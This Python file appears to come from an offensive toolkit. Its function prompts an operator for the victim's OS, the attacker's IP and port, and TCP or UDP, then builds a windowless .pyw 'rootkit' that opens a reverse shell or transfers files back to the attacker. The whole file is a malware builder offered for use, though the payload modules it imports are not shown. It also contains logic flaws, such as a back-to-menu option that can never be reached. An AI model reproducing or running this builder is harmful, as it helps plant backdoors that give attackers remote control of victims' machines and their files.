def get_rootkit():
    import os
    import sys
    import socket as s
    from os import path
    PATH = path.dirname(path.dirname(__file__))
    sys.path.insert(0, PATH)
    from Core import Color, CreateFile, Notify, RandomStr, AskFor
    T_PATH = PATH + "\\Builded\\Rootkit\\"
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    print("Please Choose Rootkit Type:\n"
          + red + "{1}--> Reverse Shell\n"
          + green + '{2}--> File Transfer (+ Reverse Shell)\n' + reset)
    r_type = str(input("..> "))
    print(
        "A " + red + "RootKit" + reset + " ?"
        + "What is The Connection Type : \n"
        + red + "{1}--> TCP\n"
        + green + "{2}--> UDP\n"
        + blue + "{000}--> Back To Main Menu" + reset
    )
    CHOICE = str(input("..> "))
    print(CHOICE)
    if "1" == CHOICE:
        CHOICE = "TCP"
    elif "2" == CHOICE:
        CHOICE = "UDP"
    else:
        print("{} is not a valid choice".format(CHOICE))

    if CHOICE == "000":
        pass

    elif CHOICE == "TCP" or CHOICE == "UDP":
        # Getting Some Required Information : PATH Of Rootkit , Attacker_Ip : Ip or Domain to Send data to it
        # Attacker_Port : An open port on attacker machine

        # Getting File PATH
        UPATH = T_PATH + AskFor("Enter A Name For Your File .\nIt Will Be --> {}".format(T_PATH) +
                                "YOUR_FILE_NAME.pyw : ", 'Using \\| As File Path',) + ".pyw"

        # Very important
        Notify("question",
               "Whats Your Victim(s) Operating System(s)" + red +
               " {W}indows" + green + " {L}inux" + reset

               )
        VICTIM_OS = str(input("..> ")).upper()

        if VICTIM_OS == "000":
            pass

        elif VICTIM_OS in ["W", "L"]:
            VICTIM_OS = VICTIM_OS.replace("W", "WINDOWS", -1)
            VICTIM_OS = VICTIM_OS.replace("L", "LINUX", -1)
            # Getting Attacker ip
            ATTACKER_IP = AskFor("Whats You IP Address, Host Name Or Domain Name " +
                                 "Left it to empty to use your own hostname (automic) : ",
                                 "Using IP \\| As Attacker_ip", default=['', s.gethostbyname],
                                 args=s.gethostname()
                                 )
            # Getting an open port on attacker port

            ATTACKER_PORT = AskFor("Whats An Open Port In Your Machine " +
                                   "Left It '-1' To Use Default Port (1534 Eclipse's "
                                   "default communicate port) : ", "Using \\| As Attacker_Port",
                                   default=[-1, 1534], type=int,
                                   )
            strs = []
            for i in range(0, 3):
                strs.append(RandomStr())
            if r_type == '1':
                if CHOICE == 'TCP':
                    import Core._payloads._rootkit.reverse_tcp as r
                    rootkit = r._get_rootkit(
                        ATTACKER_IP, ATTACKER_PORT, VICTIM_OS, strs)
                elif CHOICE == 'UDP':
                    import Core._payloads._rootkit.reverse_udp as r
                    rootkit = r._get_rootkit(
                        ATTACKER_IP, ATTACKER_PORT, VICTIM_OS, strs)
            elif r_type == '2':
                if CHOICE == 'TCP':
                    import Core._payloads._rootkit.ft_tcp as r
                    rootkit = r._get_rootkit(
                        ATTACKER_IP, ATTACKER_PORT, VICTIM_OS, strs)
                elif CHOICE == 'UDP':
                    import Core._payloads._rootkit.ft_udp as r
                    rootkit = r._get_rootkit(
                        ATTACKER_IP, ATTACKER_PORT, VICTIM_OS, strs)

            else:
                # Bad OS
                Notify(
                    "problem",
                    "Invalid OS [-- {} --]".format(VICTIM_OS)
                )
            UPATH = CreateFile(UPATH)
            return rootkit, UPATH
    else:
        print("Port is either TCP or UDP but yours is not one.try again")
